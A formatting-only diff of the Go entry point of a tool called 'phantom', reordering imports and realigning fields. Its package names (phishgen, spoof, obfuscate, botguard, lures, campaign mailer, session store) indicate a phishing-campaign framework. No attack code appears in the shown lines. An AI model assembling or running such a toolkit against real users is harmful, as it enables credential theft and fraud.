@@ -8,8 +8,8 @@ import (
 	"log"
 	"net/http"
 	"os"
-	"strconv"
 	"path/filepath"
+	"strconv"
 	"time"
 
 	"github.com/phantom-v2/phantom/core"
@@ -18,8 +18,8 @@ import (
 	"github.com/phantom-v2/phantom/core/session"
 	"github.com/phantom-v2/phantom/internal/api"
 	"github.com/phantom-v2/phantom/internal/blocklist"
-	"github.com/phantom-v2/phantom/internal/campaign"
 	"github.com/phantom-v2/phantom/internal/botguard"
+	"github.com/phantom-v2/phantom/internal/campaign"
 	"github.com/phantom-v2/phantom/internal/config"
 	"github.com/phantom-v2/phantom/internal/deploy"
 	"github.com/phantom-v2/phantom/internal/dns"
@@ -30,13 +30,13 @@ import (
 	"github.com/phantom-v2/phantom/internal/notify"
 	"github.com/phantom-v2/phantom/internal/obfuscate"
 	"github.com/phantom-v2/phantom/internal/phishgen"
-	"github.com/phantom-v2/phantom/internal/puppet"
 	"github.com/phantom-v2/phantom/internal/pullsync"
-	"github.com/phantom-v2/phantom/internal/setup"
+	"github.com/phantom-v2/phantom/internal/puppet"
 	"github.com/phantom-v2/phantom/internal/ratelimit"
+	"github.com/phantom-v2/phantom/internal/setup"
 	"github.com/phantom-v2/phantom/internal/spoof"
-	"github.com/phantom-v2/phantom/internal/upstream"
 	internaltls "github.com/phantom-v2/phantom/internal/tls"
+	"github.com/phantom-v2/phantom/internal/upstream"
 	redisstore "github.com/phantom-v2/phantom/storage/redis"
 	"github.com/phantom-v2/phantom/storage/sqlite"
 )
@@ -278,7 +278,7 @@ func main() {
 	}
 	campSvc := &campaign.Service{
 		Campaigns: campStore, Lures: luresStore,
-		Mail:      &mailer.Sender{Cfg: mailCfg},
+		Mail: &mailer.Sender{Cfg: mailCfg},
 	}
 	eng.SetTracker(campaign.Tracker{Campaigns: campStore})
 	campSvc.Watch(ctx, bus.Inner)
@@ -331,19 +331,19 @@ func main() {
 			},
 			Config: func() map[string]any {
 				return map[string]any{
-					"domains":        cfg.Domains,
-					"shared_443":     cfg.Shared443,
-					"upstream_tls":   cfg.TLS.UpstreamTLS,
-					"dns_provider":   cfg.TLS.DNSProvider,
-					"wildcard":       cfg.TLS.Wildcard,
-					"autocert":       cfg.TLS.Autocert != nil && *cfg.TLS.Autocert,
-					"telegram":       cfg.Notify.TelegramEnabled,
+					"domains":         cfg.Domains,
+					"shared_443":      cfg.Shared443,
+					"upstream_tls":    cfg.TLS.UpstreamTLS,
+					"dns_provider":    cfg.TLS.DNSProvider,
+					"wildcard":        cfg.TLS.Wildcard,
+					"autocert":        cfg.TLS.Autocert != nil && *cfg.TLS.Autocert,
+					"telegram":        cfg.Notify.TelegramEnabled,
 					"session_ttl_min": cfg.Storage.SessionTTLMin,
-					"https_port": cfg.HTTPSPort,
+					"https_port":      cfg.HTTPSPort,
 				}
 			},
-			PhishDir:    dir,
-			OnSmart:     persistSmart,
+			PhishDir: dir,
+			OnSmart:  persistSmart,
 			OnReload: func() error {
 				if err := st.Reload(dir); err != nil {
 					return err
